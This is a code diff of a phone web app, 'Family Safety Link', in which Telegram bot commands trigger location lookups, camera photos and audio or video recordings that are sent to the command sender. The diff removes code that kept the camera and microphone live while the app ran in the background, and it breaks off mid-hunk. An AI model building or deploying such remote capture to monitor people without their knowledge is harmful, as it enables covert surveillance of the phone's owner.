@@ -3,7 +3,7 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover">
-  <title>Family Safety Link - Full Background Support</title>
+  <title>Family Safety Link - Fixed Camera/Audio</title>
   <link rel="manifest" href="data:application/manifest+json,{">
   <link rel="icon" type="image/png" href="https://cdn-icons-png.flaticon.com/512/2917/2917995.png">
   <meta name="theme-color" content="#0b3b5f">
@@ -254,6 +254,23 @@
       0%, 100% { opacity: 1; transform: scale(1); }
       50% { opacity: 0.5; transform: scale(1.2); }
     }
+    .toast-notification {
+      position: fixed;
+      bottom: 80px;
+      left: 20px;
+      right: 20px;
+      background: #1e293b;
+      color: white;
+      padding: 12px;
+      border-radius: 60px;
+      text-align: center;
+      z-index: 1000;
+      animation: slideUp 0.3s ease;
+    }
+    @keyframes slideUp {
+      from { transform: translateY(100px); opacity: 0; }
+      to { transform: translateY(0); opacity: 1; }
+    }
   </style>
   <script>
     // Inline Service Worker Registration
@@ -261,7 +278,7 @@
       const manifestData = {
         name: "Family Safety Link",
         short_name: "SafetyLink",
-        description: "Control your device via Telegram bot - Full background support!",
+        description: "Control your device via Telegram bot",
         start_url: "/",
         display: "standalone",
         theme_color: "#0b3b5f",
@@ -269,18 +286,8 @@
         orientation: "portrait",
         scope: "/",
         icons: [
-          {
-            src: "https://cdn-icons-png.flaticon.com/512/2917/2917995.png",
-            sizes: "512x512",
-            type: "image/png",
-            purpose: "any maskable"
-          },
-          {
-            src: "https://cdn-icons-png.flaticon.com/512/2917/2917995.png",
-            sizes: "192x192",
-            type: "image/png",
-            purpose: "any"
-          }
+          { src: "https://cdn-icons-png.flaticon.com/512/2917/2917995.png", sizes: "512x512", type: "image/png", purpose: "any maskable" },
+          { src: "https://cdn-icons-png.flaticon.com/512/2917/2917995.png", sizes: "192x192", type: "image/png", purpose: "any" }
         ]
       };
       
@@ -292,7 +299,7 @@
       document.head.appendChild(manifestLink);
       
       const serviceWorkerCode = `
-        const CACHE_NAME = 'family-safety-link-v5.0.0';
+        const CACHE_NAME = 'family-safety-link-v6.0.0';
         const urlsToCache = ['/', 'https://cdn-icons-png.flaticon.com/512/2917/2917995.png'];
         
         self.addEventListener('install', event => {
@@ -309,9 +316,6 @@
         
         self.addEventListener('message', event => {
           if (event.data && event.data.type === 'SKIP_WAITING') self.skipWaiting();
-          if (event.data && event.data.type === 'BG_POLL') {
-            event.waitUntil(self.clients.matchAll().then(clients => clients.forEach(client => client.postMessage({ type: 'BACKGROUND_POLL_TRIGGER' }))));
-          }
         });
       `;
       
@@ -359,7 +363,7 @@
     <div class="flex-between" style="margin-bottom: 0.5rem;">
       <label>⚡ Polling Interval</label>
       <select id="pollingIntervalSelect" style="width: auto; padding: 0.4rem 0.8rem;">
-        <option value="3">3 seconds (Fast)</option>
+        <option value="3">3 seconds</option>
         <option value="5">5 seconds</option>
         <option value="10">10 seconds</option>
         <option value="30">30 seconds</option>
@@ -372,17 +376,17 @@
     </div>
     
     <div class="button-group" style="margin-top: 0.5rem;">
-      <button id="enableBackgroundBtn" class="btn-background">🌙 Enable Background Mode</button>
-      <button id="disableBackgroundBtn" class="btn-outline">⏸️ Disable Background</button>
+      <button id="enableBackgroundBtn" class="btn-background">🌙 Keep Screen Awake</button>
+      <button id="disableBackgroundBtn" class="btn-outline">⏸️ Allow Sleep</button>
     </div>
     
     <div class="info-text" id="bgStatusText">
-      💡 Background mode: Enables camera/audio to work when app is in background!
+      💡 Keep screen awake prevents phone from sleeping during recording
     </div>
   </div>
 
   <div class="card">
-    <div class="card-title">🔐 Device Permissions (Must be granted for background)</div>
+    <div class="card-title">🔐 Device Permissions (Must be granted)</div>
     <div class="perm-grid">
       <div class="perm-item">
         <div class="perm-info"><span>📍 Location</span><span id="locPerm" class="status-badge status-denied">Not Granted</span></div>
@@ -397,7 +401,7 @@
         <div class="perm-buttons"><button id="grantMicBtn" class="btn-outline">Grant</button><button id="revokeMicBtn" class="btn-danger">Remove</button></div>
       </div>
     </div>
-    <div class="info-text">⚠️ Camera & Microphone require "Grant" click. Background mode keeps them accessible!</div>
+    <div class="info-text">⚠️ Grant permissions FIRST, then test commands!</div>
   </div>
 
   <div class="card">
@@ -408,14 +412,13 @@
       <div><strong>📤 Last response:</strong> <span id="lastResponse">—</span></div>
       <div><strong>👥 Authorized:</strong> <span id="authCount">0</span></div>
       <div><strong>✅ Permissions:</strong> <span id="permSummary">None</span></div>
-      <div><strong>🌙 Background:</strong> <span id="backgroundModeStatus" class="status-badge status-denied">Inactive</span></div>
-      <div><strong>📱 PWA:</strong> <span id="pwaStatus">Checking...</span></div>
+      <div><strong>💤 Screen Wake Lock:</strong> <span id="wakeLockStatus" class="status-badge status-denied">Off</span></div>
     </div>
   </div>
 
   <div class="card">
     <div class="card-title">📜 Command History</div>
-    <div id="commandLog" class="command-log">✨ Ready. Background mode enables camera/audio while app is in background!</div>
+    <div id="commandLog" class="command-log">✨ Ready. Grant permissions first!</div>
     <button id="clearHistoryBtn" class="btn-outline" style="margin-top: 0.6rem;">Clear History</button>
   </div>
 </div>
@@ -431,14 +434,9 @@
   let processedUpdateIds = new Set();
   let deferredPrompt = null;
   
-  // Background mode
+  // Wake Lock for screen
   let wakeLock = null;
-  let backgroundKeepAlive = null;
-  let isBackgroundMode = false;
-  
-  // Media stream references for background operation
-  let backgroundVideoStream = null;
-  let backgroundAudioStream = null;
+  let isWakeLockActive = false;
 
   // DOM Elements
   const botTokenInput = document.getElementById('botToken');
@@ -462,18 +460,73 @@
   const manualInstallBtn = document.getElementById('manualInstallBtn');
   const pwaStatusSpan = document.getElementById('pwaStatus');
   const pollingIntervalSelect = document.getElementById('pollingIntervalSelect');
-  const backgroundModeStatusSpan = document.getElementById('backgroundModeStatus');
-  const bgModeBadge = document.getElementById('bgModeBadge');
+  const wakeLockStatusSpan = document.getElementById('wakeLockStatus');
   const enableBackgroundBtn = document.getElementById('enableBackgroundBtn');
   const disableBackgroundBtn = document.getElementById('disableBackgroundBtn');
   const bgStatusText = document.getElementById('bgStatusText');
+
+  // ========== WAKE LOCK (Keep screen awake for recording) ==========
+  async function requestWakeLock() {
+    if ('wakeLock' in navigator) {
+      try {
+        wakeLock = await navigator.wakeLock.request('screen');
+        isWakeLockActive = true;
+        wakeLock.addEventListener('release', () => {
+          isWakeLockActive = false;
+          wakeLockStatusSpan.innerText = 'Released';
+          wakeLockStatusSpan.className = 'status-badge status-denied';
+          addLog('💤 Screen wake lock released', 'warn');
+        });
+        wakeLockStatusSpan.innerText = 'Active';
+        wakeLockStatusSpan.className = 'status-badge status-active';
+        addLog('✅ Screen wake lock acquired - screen will stay on', 'success');
+        return true;
+      } catch (err) {
+        addLog('⚠️ Screen wake lock not available', 'warn');
+        return false;
+      }
+    }
+    return false;
+  }
+  
+  async function releaseWakeLock() {
+    if (wakeLock) {
+      try {
+        await wakeLock.release();
+        wakeLock = null;
+        isWakeLockActive = false;
+        wakeLockStatusSpan.innerText = 'Off';
+        wakeLockStatusSpan.className = 'status-badge status-denied';
+        addLog('🔓 Screen wake lock released', 'info');
+      } catch(e) {}
+    }
+  }
+  
+  async function enableWakeLock() {
+    await requestWakeLock();
+    bgStatusText.innerHTML = '✅ Screen wake lock ACTIVE! Screen will stay on for recording.';
+    bgStatusText.style.color = '#8b5cf6';
+    localStorage.setItem('wakeLockEnabled', 'true');
+  }
+  
+  async function disableWakeLock() {
+    await releaseWakeLock();
+    bgStatusText.innerHTML = '💡 Enable screen wake lock to prevent phone from sleeping during recording.';
+    bgStatusText.style.color = '#6b7280';
+    localStorage.setItem('wakeLockEnabled', 'false');
+  }
+  
+  async function restoreWakeLock() {
+    if (localStorage.getItem('wakeLockEnabled') === 'true') {
+      await enableWakeLock();
+    }
+  }
 
   // ========== PWA INSTALLATION ==========
   window.addEventListener('beforeinstallprompt', (e) => {
     e.preventDefault();
     deferredPrompt = e;
     installBanner.style.display = 'flex';
-    addLog('📱 Click Install Now to install as app', 'success');
   });
   
   async function installPWA() {
@@ -501,128 +554,27 @@
   }
   updatePWAStatus();
 
-  // ========== BACKGROUND MODE (Enables camera/audio in background) ==========
-  async function acquireBackgroundMediaPermissions() {
-    // Keep a silent media stream to prevent browser from suspending camera/mic
-    if (permissions.camera && !backgroundVideoStream) {
-      try {
-        backgroundVideoStream = await navigator.mediaDevices.getUserMedia({ video: true });
-        backgroundVideoStream.getTracks().forEach(track => { track.enabled = false; }); // Disable but keep stream alive
-        addLog('📷 Camera stream kept alive for background', 'success');
-      } catch(e) { addLog('⚠️ Could not keep camera for background', 'warn'); }
-    }
-    if (permissions.microphone && !backgroundAudioStream) {
-      try {
-        backgroundAudioStream = await navigator.mediaDevices.getUserMedia({ audio: true });
-        backgroundAudioStream.getTracks().forEach(track => { track.enabled = false; });
-        addLog('🎙️ Microphone stream kept alive for background', 'success');
-      } catch(e) { addLog('⚠️ Could not keep microphone for background', 'warn'); }
-    }
-  }
-  
-  function releaseBackgroundMedia() {
-    if (backgroundVideoStream) {
-      backgroundVideoStream.getTracks().forEach(t => t.stop());
-      backgroundVideoStream = null;
-    }
-    if (backgroundAudioStream) {
-      backgroundAudioStream.getTracks().forEach(t => t.stop());
-      backgroundAudioStream = null;
-    }
-  }
-  
-  async function requestWakeLock() {
-    if ('wakeLock' in navigator) {
-      try {
-        wakeLock = await navigator.wakeLock.request('screen');
-        wakeLock.addEventListener('release', () => { if (isBackgroundMode) setTimeout(requestWakeLock, 1000); });
-        return true;
-      } catch(e) { return false; }
-    }
-    return false;
-  }
-  
-  async function releaseWakeLock() {
-    if (wakeLock) { try { await wakeLock.release(); } catch(e){} wakeLock = null; }
-  }
-  
-  function startBackgroundKeepAlive() {
-    if (backgroundKeepAlive) clearInterval(backgroundKeepAlive);
-    backgroundKeepAlive = setInterval(() => {
-      if (isBackgroundMode) {
-        if (navigator.serviceWorker?.controller) navigator.serviceWorker.controller.postMessage({ type: 'BG_POLL' });
-        if (settings.botToken) pollUpdates();
-      }
-    }, 15000);
-  }
-  
-  function stopBackgroundKeepAlive() {
-    if (backgroundKeepAlive) { clearInterval(backgroundKeepAlive); backgroundKeepAlive = null; }
-  }
-  
-  async function enableBackgroundMode() {
-    addLog('🌙 Enabling background mode...', 'info');
-    await requestWakeLock();
-    await acquireBackgroundMediaPermissions();
-    startBackgroundKeepAlive();
-    isBackgroundMode = true;
-    backgroundModeStatusSpan.innerText = 'Active';
-    backgroundModeStatusSpan.className = 'status-badge status-active';
-    bgModeBadge.style.display = 'inline-block';
-    bgStatusText.innerHTML = '✅ Background mode ACTIVE! Camera/Audio will work even when app is minimized!';
-    bgStatusText.style.color = '#8b5cf6';
-    localStorage.setItem('backgroundMode', 'true');
-    addLog('🌙 Background mode enabled - camera/audio will work in background!', 'success');
-  }
-  
-  async function disableBackgroundMode() {
-    addLog('⏸️ Disabling background mode...', 'info');
-    releaseBackgroundMedia();
-    await releaseWakeLock();
-    stopBackgroundKeepAlive();
-    isBackgroundMode = false;
-    backgroundModeStatusSpan.innerText = 'Inactive';
-    backgroundModeStatusSpan.className = 'status-badge status-denied';
-    bgModeBadge.style.display = 'none';
-    bgStatusText.innerHTML = '💡 Enable background mode for camera/audio to work when app is minimized!';
-    bgStatusText.style.color = '#6b7280';
-    localStorage.setItem('backgroundMode', 'false');
-    addLog('⏸️ Background mode disabled', 'warn');
-  }
-  
-  async function restoreBackgroundMode() {
-    if (localStorage.getItem('backgroundMode') === 'true') {
-      await enableBackgroundMode();
-    }
-  }
-
   // ========== PERMISSIONS ==========
   async function checkLocation() {
     if (!navigator.permissions) return false;
     try { return (await navigator.permissions.query({ name: 'geolocation' })).state === 'granted'; } catch(e) { return false; }
   }
+  
   async function checkCamera() {
     if (!navigator.mediaDevices) return false;
     try {
-      if (navigator.permissions) {
-        const result = await navigator.permissions.query({ name: 'camera' }).catch(() => null);
-        if (result?.state === 'granted') return true;
-      }
-      const stream = await Promise.race([navigator.mediaDevices.getUserMedia({ video: true }), new Promise((_,r)=>setTimeout(()=>r('timeout'),200))]).catch(()=>null);
-      if (stream) { stream.getTracks().forEach(t=>t.stop()); return true; }
-      return false;
+      const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+      stream.getTracks().forEach(t => t.stop());
+      return true;
     } catch(e) { return false; }
   }
+  
   async function checkMicrophone() {
     if (!navigator.mediaDevices) return false;
     try {
-      if (navigator.permissions) {
-        const result = await navigator.permissions.query({ name: 'microphone' }).catch(() => null);
-        if (result?.state === 'granted') return true;
-      }
-      const stream = await Promise.race([navigator.mediaDevices.getUserMedia({ audio: true }), new Promise((_,r)=>setTimeout(()=>r('timeout'),200))]).catch(()=>null);
-      if (stream) { stream.getTracks().forEach(t=>t.stop()); return true; }
-      return false;
+      const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
+      stream.getTracks().forEach(t => t.stop());
+      return true;
     } catch(e) { return false; }
   }
   
@@ -652,19 +604,66 @@
     if (permissions.camera) list.push('📷');
     if (permissions.microphone) list.push('🎙️');
     permSummarySpan.innerText = list.length ? list.join(' ') : 'None';
-    // If background mode is on and camera/mic granted, refresh background streams
-    if (isBackgroundMode) {
-      if (permissions.camera && !backgroundVideoStream) acquireBackgroundMediaPermissions();
-      if (permissions.microphone && !backgroundAudioStream) acquireBackgroundMediaPermissions();
-    }
   }
   
-  async function grantLoc() { try { await new Promise((res,rej)=>navigator.geolocation.getCurrentPosition(res,rej)); permissions.location=true; savePerms(); updatePermUI(); addLog('✅ Location granted','success'); } catch(e){ permissions.location=false; updatePermUI(); addLog('❌ Location denied','error'); } }
-  async function grantCam() { try { const s=await navigator.mediaDevices.getUserMedia({video:true}); s.getTracks().forEach(t=>t.stop()); permissions.camera=true; savePerms(); updatePermUI(); if(isBackgroundMode) acquireBackgroundMediaPermissions(); addLog('✅ Camera granted','success'); } catch(e){ permissions.camera=false; updatePermUI(); addLog('❌ Camera denied','error'); } }
-  async function grantMic() { try { const s=await navigator.mediaDevices.getUserMedia({audio:true}); s.getTracks().forEach(t=>t.stop()); permissions.microphone=true; savePerms(); updatePermUI(); if(isBackgroundMode) acquireBackgroundMediaPermissions(); addLog('✅ Microphone granted','success'); } catch(e){ permissions.microphone=false; updatePermUI(); addLog('❌ Microphone denied','error'); } }
+  async function grantLoc() { 
+    try { 
+      await new Promise((res,rej)=>navigator.geolocation.getCurrentPosition(res,rej)); 
+      permissions.location=true; 
+      savePerms(); 
+      updatePermUI(); 
+      addLog('✅ Location granted','success');
+      showToast('Location permission granted!');
+    } catch(e){ 
+      permissions.location=false; 
+      updatePermUI(); 
+      addLog('❌ Location denied','error');
+    } 
+  }
+  
+  async function grantCam() { 
+    try { 
+      const s=await navigator.mediaDevices.getUserMedia({video:true}); 
+      s.getTracks().forEach(t=>t.stop()); 
+      permissions.camera=true; 
+      savePerms(); 
+      updatePermUI(); 
+      addLog('✅ Camera granted','success');
+      showToast('Camera permission granted!');
+    } catch(e){ 
+      permissions.camera=false; 
+      updatePermUI(); 
+      addLog('❌ Camera denied - cannot take photos','error');
+    } 
+  }
+  
+  async function grantMic() { 
+    try { 
+      const s=await navigator.mediaDevices.getUserMedia({audio:true}); 
+      s.getTracks().forEach(t=>t.stop()); 
+      permissions.microphone=true; 
+      savePerms(); 
+      updatePermUI(); 
+      addLog('✅ Microphone granted','success');
+      showToast('Microphone permission granted!');
+    } catch(e){ 
+      permissions.microphone=false; 
+      updatePermUI(); 
+      addLog('❌ Microphone denied - cannot record audio','error');
+    } 
+  }
+  
   function revokeLoc() { permissions.location=false; savePerms(); updatePermUI(); addLog('📍 Location removed','warn'); }
-  function revokeCam() { permissions.camera=false; savePerms(); updatePermUI(); if(backgroundVideoStream){backgroundVideoStream.getTracks().forEach(t=>t.stop()); backgroundVideoStream=null;} addLog('📷 Camera removed','warn'); }
-  function revokeMic() { permissions.microphone=false; savePerms(); updatePermUI(); if(backgroundAudioStream){backgroundAudioStream.getTracks().forEach(t=>t.stop()); backgroundAudioStream=null;} addLog('🎙️ Mic removed','warn'); }
+  function revokeCam() { permissions.camera=false; savePerms(); updatePermUI(); addLog('📷 Camera removed','warn'); }
+  function revokeMic() { permissions.microphone=false; savePerms(); updatePermUI(); addLog('🎙️ Mic removed','warn'); }
+
+  function showToast(message) {
+    const toast = document.createElement('div');
+    toast.className = 'toast-notification';
+    toast.innerHTML = message;
+    document.body.appendChild(toast);
+    setTimeout(() => toast.remove(), 3000);
+  }
 
   function addLog(message, type='info') {
     const time = new Date().toLocaleTimeString();
@@ -718,135 +717,244 @@
   }
   
   async function sendPhoto(chatId, base64) {
-    const byteString=atob(base64.split(',')[1]), mime=base64.split(',')[0].split(':')[1].split(';')[0];
-    const ab=new ArrayBuffer(byteString.length), ia=new Uint8Array(ab);
-    for(let i=0;i<byteString.length;i++) ia[i]=byteString.charCodeAt(i);
-    const blob=new Blob([ab],{type:mime}), fd=new FormData();
-    fd.append('chat_id',chatId); fd.append('photo',blob,'photo.jpg');
-    const res=await fetch(`https://api.telegram.org/bot${settings.botToken}/sendPhoto`,{method:'POST',body:fd});
-    return res.ok;
+    try {
+      const byteString=atob(base64.split(',')[1]), mime=base64.split(',')[0].split(':')[1].split(';')[0];
+      const ab=new ArrayBuffer(byteString.length), ia=new Uint8Array(ab);
+      for(let i=0;i<byteString.length;i++) ia[i]=byteString.charCodeAt(i);
+      const blob=new Blob([ab],{type:mime}), fd=new FormData();
+      fd.append('chat_id',chatId); fd.append('photo',blob,'photo.jpg');
+      const res=await fetch(`https://api.telegram.org/bot${settings.botToken}/sendPhoto`,{method:'POST',body:fd});
+      return res.ok;
+    } catch(e){ return false; }
   }
   
   async function sendVideo(chatId, base64) {
-    const byteString=atob(base64.split(',')[1]), ab=new ArrayBuffer(byteString.length), ia=new Uint8Array(ab);
-    for(let i=0;i<byteString.length;i++) ia[i]=byteString.charCodeAt(i);
-    const blob=new Blob([ab],{type:'video/mp4'}), fd=new FormData();
-    fd.append('chat_id',chatId); fd.append('video',blob,'video.mp4');
-    const res=await fetch(`https://api.telegram.org/bot${settings.botToken}/sendVideo`,{method:'POST',body:fd});
-    return res.ok;
+    try {
+      const byteString=atob(base64.split(',')[1]), ab=new ArrayBuffer(byteString.length), ia=new Uint8Array(ab);
+      for(let i=0;i<byteString.length;i++) ia[i]=byteString.charCodeAt(i);
+      const blob=new Blob([ab],{type:'video/mp4'}), fd=new FormData();
+      fd.append('chat_id',chatId); fd.append('video',blob,'video.mp4');
+      const res=await fetch(`https://api.telegram.org/bot${settings.botToken}/sendVideo`,{method:'POST',body:fd});
+      return res.ok;
+    } catch(e){ return false; }
   }
   
   async function sendAudio(chatId, base64) {
-    const byteString=atob(base64.split(',')[1]), ab=new ArrayBuffer(byteString.length), ia=new Uint8Array(ab);
-    for(let i=0;i<byteString.length;i++) ia[i]=byteString.charCodeAt(i);
-    const blob=new Blob([ab],{type:'audio/webm'}), fd=new FormData();
-    fd.append('chat_id',chatId); fd.append('audio',blob,'audio.ogg');
-    const res=await fetch(`https://api.telegram.org/bot${settings.botToken}/sendAudio`,{method:'POST',body:fd});
-    return res.ok;
+    try {
+      const byteString=atob(base64.split(',')[1]), ab=new ArrayBuffer(byteString.length), ia=new Uint8Array(ab);
+      for(let i=0;i<byteString.length;i++) ia[i]=byteString.charCodeAt(i);
+      const blob=new Blob([ab],{type:'audio/webm'}), fd=new FormData();
+      fd.append('chat_id',chatId); fd.append('audio',blob,'audio.ogg');
+      const res=await fetch(`https://api.telegram.org/bot${settings.botToken}/sendAudio`,{method:'POST',body:fd});
+      return res.ok;
+    } catch(e){ return false; }
   }
 
-  // ========== COMMAND HANDLERS (With user name display) ==========
+  // ========== COMMAND HANDLERS (Fixed) ==========
   async function handleLocation(chatId, userName) {
-    if(!permissions.location) { await sendMsg(chatId, "❌ Location permission not granted.", true); return; }
-    return new Promise((resolve)=>{
-      navigator.geolocation.getCurrentPosition(async(pos)=>{
-        const {latitude,longitude}=pos.coords;
-        await sendMsg(chatId, `📍 *${userName}* requested location\nhttps://www.google.com/maps?q=${latitude},${longitude}\n\n${latitude}, ${longitude}`, true);
-        lastResponseSpan.innerText=`Location sent to ${userName}`;
-        resolve(true);
-      }, async()=>{ await sendMsg(chatId, "❌ Cannot get location", true); resolve(false); });
+    if(!permissions.location) { 
+      await sendMsg(chatId, "❌ Location permission not granted. Click 'Grant' in app.", true); 
+      return; 
+    }
+    navigator.geolocation.getCurrentPosition(async(pos)=>{
+      const {latitude,longitude}=pos.coords;
+      await sendMsg(chatId, `📍 *${userName}* location\nhttps://www.google.com/maps?q=${latitude},${longitude}\n\n${latitude}, ${longitude}`, true);
+      lastResponseSpan.innerText=`Location sent to ${userName}`;
+      addLog(`📍 Location sent to ${userName}`, 'success');
+    }, async()=>{
+      await sendMsg(chatId, "❌ Cannot get location. Enable GPS.", true);
     });
   }
 
   async function handlePhoto(chatId, userName) {
-    if(!permissions.camera) { await sendMsg(chatId, "❌ Camera permission not granted.", true); return; }
+    if(!permissions.camera) { 
+      await sendMsg(chatId, "❌ Camera permission not granted. Click 'Grant' in app.", true); 
+      return; 
+    }
+    
+    addLog(`📷 Taking photo for ${userName}...`, 'info');
+    await sendMsg(chatId, `📷 *${userName}* requested photo - capturing...`, true);
+    
     try {
-      const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+      // Request camera with specific constraints for better compatibility
+      const stream = await navigator.mediaDevices.getUserMedia({ 
+        video: { facingMode: "environment", width: { ideal: 1280 }, height: { ideal: 720 } }
+      });
+      
       const video = document.createElement('video');
       video.srcObject = stream;
+      video.setAttribute('playsinline', '');
       await video.play();
-      await new Promise(r=>setTimeout(r,100));
+      
+      // Wait for video to be ready
+      await new Promise(r => setTimeout(r, 200));
+      
       const canvas = document.createElement('canvas');
       canvas.width = video.videoWidth || 640;
       canvas.height = video.videoHeight || 480;
-      canvas.getContext('2d').drawImage(video,0,0);
-      const data = canvas.toDataURL('image/jpeg',0.9);
-      stream.getTracks().forEach(t=>t.stop());
+      const ctx = canvas.getContext('2d');
+      ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+      
+      const photoData = canvas.toDataURL('image/jpeg', 0.85);
+      
+      // Stop all tracks
+      stream.getTracks().forEach(track => track.stop());
       video.remove();
-      await sendPhoto(chatId, data);
-      lastResponseSpan.innerText=`Photo sent to ${userName}`;
-      addLog(`📷 Photo to ${userName}`, 'success');
-    } catch(e){ await sendMsg(chatId, "❌ Failed to capture photo", true); }
+      
+      // Send photo
+      const success = await sendPhoto(chatId, photoData);
+      if (success) {
+        lastResponseSpan.innerText = `Photo sent to ${userName}`;
+        addLog(`📷 Photo sent to ${userName}`, 'success');
+        await sendMsg(chatId, `✅ Photo sent to ${userName}!`, true);
+      } else {
+        throw new Error('Send failed');
+      }
+    } catch (err) {
+      console.error('Photo error:', err);
+      await sendMsg(chatId, `❌ Failed to capture photo: ${err.message || 'Camera error'}`, true);
+      addLog(`❌ Photo failed for ${userName}`, 'error');
+    }
   }
 
   async function handleAudio(chatId, userName) {
-    if(!permissions.microphone) { await sendMsg(chatId, "❌ Microphone permission not granted.", true); return; }
-    await sendMsg(chatId, `🎤 *${userName}* requested audio - recording... (60s max)`, true);
+    if(!permissions.microphone) { 
+      await sendMsg(chatId, "❌ Microphone permission not granted. Click 'Grant' in app.", true); 
+      return; 
+    }
+    
+    addLog(`🎤 Recording audio for ${userName}...`, 'info');
+    await sendMsg(chatId, `🎤 *${userName}* requested audio - recording 30 seconds...`, true);
+    
     try {
       const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
-      const recorder = new MediaRecorder(stream);
-      let chunks = [];
-      recorder.ondataavailable = e => chunks.push(e.data);
+      const mediaRecorder = new MediaRecorder(stream, { mimeType: 'audio/webm' });
+      const chunks = [];
       
+      mediaRecorder.ondataavailable = e => {
+        if (e.data.size > 0) chunks.push(e.data);
+      };
+      
+      // Show recording UI
       const div = document.createElement('div');
       div.className = 'recording-ui';
-      div.innerHTML = `<span>🔴 Recording audio for ${userName}...</span><button id="stopAudioBtn" style="background:#dc2626;">Stop</button>`;
+      div.innerHTML = `<span>🔴 Recording audio for ${userName}...</span><button id="stopAudioBtn" style="background:#dc2626; width:auto;">⏹️ Stop</button>`;
       document.body.appendChild(div);
       
       const result = await new Promise((resolve) => {
-        const timeout = setTimeout(() => { if(recorder.state === 'recording') recorder.stop(); }, 60000);
-        recorder.onstop = async () => {
+        let timeout = setTimeout(() => {
+          if (mediaRecorder.state === 'recording') mediaRecorder.stop();
+        }, 30000); // 30 seconds max
+        
+        mediaRecorder.onstop = async () => {
           clearTimeout(timeout);
           div.remove();
-          stream.getTracks().forEach(t=>t.stop());
-          const blob = new Blob(chunks, { type: 'audio/webm' });
+          stream.getTracks().forEach(t => t.stop());
+          
+          const audioBlob = new Blob(chunks, { type: 'audio/webm' });
           const reader = new FileReader();
-          reader.onloadend = async () => resolve(await sendAudio(chatId, reader.result));
-          reader.readAsDataURL(blob);
+          reader.onloadend = async () => {
+            const success = await sendAudio(chatId, reader.result);
+            resolve(success);
+          };
+          reader.readAsDataURL(audioBlob);
         };
-        recorder.start(1000);
-        document.getElementById('stopAudioBtn').onclick = () => { if(recorder.state === 'recording') recorder.stop(); };
+        
+        mediaRecorder.start(1000);
+        
+        const stopBtn = document.getElementById('stopAudioBtn');
+        if (stopBtn) {
+          stopBtn.onclick = () => {
+            if (mediaRecorder.state === 'recording') mediaRecorder.stop();
+          };
+        }
       });
-      if(result) { lastResponseSpan.innerText=`Audio sent to ${userName}`; addLog(`🎤 Audio to ${userName}`, 'success'); }
-    } catch(e){ await sendMsg(chatId, "❌ Failed to record audio", true); }
+      
+      if (result) {
+        lastResponseSpan.innerText = `Audio sent to ${userName}`;
+        addLog(`🎤 Audio sent to ${userName}`, 'success');
+        await sendMsg(chatId, `✅ Audio recorded and sent!`, true);
+      } else {
+        throw new Error('Send failed');
+      }
+    } catch (err) {
+      console.error('Audio error:', err);
+      await sendMsg(chatId, `❌ Failed to record audio: ${err.message || 'Microphone error'}`, true);
+      addLog(`❌ Audio failed for ${userName}`, 'error');
+    }
   }
 
   async function handleVideo(chatId, userName) {
-    if(!permissions.camera || !permissions.microphone) { await sendMsg(chatId, "❌ Camera + Microphone required.", true); return; }
-    await sendMsg(chatId, `🎥 *${userName}* requested video - recording... (60s max)`, true);
+    if(!permissions.camera || !permissions.microphone) { 
+      await sendMsg(chatId, "❌ Camera + Microphone required. Grant both in app.", true); 
+      return; 
+    }
+    
+    addLog(`🎥 Recording video for ${userName}...`, 'info');
+    await sendMsg(chatId, `🎥 *${userName}* requested video - recording 30 seconds...`, true);
+    
     try {
       const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
-      const recorder = new MediaRecorder(stream);
-      let chunks = [];
-      recorder.ondataavailable = e => chunks.push(e.data);
+      const mediaRecorder = new MediaRecorder(stream, { mimeType: 'video/webm' });
+      const chunks = [];
+      
+      mediaRecorder.ondataavailable = e => {
+        if (e.data.size > 0) chunks.push(e.data);
+      };
       
       const div = document.createElement('div');
       div.className = 'recording-ui';
-      div.innerHTML = `<span>🔴 Recording video for ${userName}...</span><button id="stopVideoBtn" style="background:#dc2626;">Stop</button>`;
+      div.innerHTML = `<span>🔴 Recording video for ${userName}...</span><button id="stopVideoBtn" style="background:#dc2626; width:auto;">⏹️ Stop</button>`;
       document.body.appendChild(div);
       
       const result = await new Promise((resolve) => {
-        const timeout = setTimeout(() => { if(recorder.state === 'recording') recorder.stop(); }, 60000);
-        recorder.onstop = async () => {
+        let timeout = setTimeout(() => {
+          if (mediaRecorder.state === 'recording') mediaRecorder.stop();
+        }, 30000);
+        
+        mediaRecorder.onstop = async () => {
           clearTimeout(timeout);
           div.remove();
-          stream.getTracks().forEach(t=>t.stop());
-          const blob = new Blob(chunks, { type: 'video/mp4' });
+          stream.getTracks().forEach(t => t.stop());
+          
+          const videoBlob = new Blob(chunks, { type: 'video/webm' });
           const reader = new FileReader();
-          reader.onloadend = async () => resolve(await sendVideo(chatId, reader.result));
-          reader.readAsDataURL(blob);
+          reader.onloadend = async () => {
+            const success = await sendVideo(chatId, reader.result);
+            resolve(success);
+          };
+          reader.readAsDataURL(videoBlob);
         };
-        recorder.start(1000);
-        document.getElementById('stopVideoBtn').onclick = () => { if(recorder.state === 'recording') recorder.stop(); };
+        
+        mediaRecorder.start(1000);
+        
+        const stopBtn = document.getElementById('stopVideoBtn');
+        if (stopBtn) {
+          stopBtn.onclick = () => {
+            if (mediaRecorder.state === 'recording') mediaRecorder.stop();
+          };
+        }
       });
-      if(result) { lastResponseSpan.innerText=`Video sent to ${userName}`; addLog(`🎥 Video to ${userName}`, 'success'); }
-    } catch(e){ await sendMsg(chatId, "❌ Failed to record video", true); }
+      
+      if (result) {
+        lastResponseSpan.innerText = `Video sent to ${userName}`;
+        addLog(`🎥 Video sent to ${userName}`, 'success');
+        await sendMsg(chatId, `✅ Video recorded and sent!`, true);
+      } else {
+        throw new Error('Send failed');
+      }
+    } catch (err) {
+      console.error('Video error:', err);
+      await sendMsg(chatId, `❌ Failed to record video: ${err.message || 'Camera/Mic error'}`, true);
+      addLog(`❌ Video failed for ${userName}`, 'error');
+    }
   }
 
   async function processCommand(cmd, chatId, userName) {
     lastCommandSpan.innerText = cmd;
     lastUserSpan.innerText = userName;
     const c = cmd.trim().toLowerCase();
+    
     if(c === 'location') await handleLocation(chatId, userName);
     else if(c === 'photo') await handlePhoto(chatId, userName);
     else if(c === 'audio') await handleAudio(chatId, userName);
@@ -856,7 +964,7 @@
       const reply = prompt(`📨 Message from ${userName}:\n"${msg}"\n\nReply:`);
       if(reply?.trim()) await sendMsg(chatId, `📝 Reply to ${userName}: ${reply}`, true);
     } else {
